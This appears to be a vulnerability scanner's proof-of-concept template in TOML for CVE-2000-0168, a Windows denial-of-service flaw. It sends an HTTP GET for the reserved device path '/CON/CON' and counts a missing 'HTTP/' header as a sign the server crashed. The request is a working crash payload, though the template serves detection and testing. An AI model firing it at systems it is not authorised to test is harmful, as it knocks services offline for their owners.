[info]
author = "ave"
description = "向目标 HTTP 服务发送包含 DOS 保留设备名（CON）的路径请求，若服务器崩溃无法响应则验证存在 CVE-2000-0168 设备名路径解析拒绝服务漏洞。"
id = "POC-AVE-2000-0148"
name = "Microsoft Windows 设备名路径拒绝服务漏洞 PoC"
severity = "medium"
tags = [
    "cve-2000-0168",
    "dos",
    "windows",
]
vuln_id = [
    "CVE-2000-0168",
    "AVE-2000-0148",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/CON/CON"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "header"
type = "word"
words = ["HTTP/"]
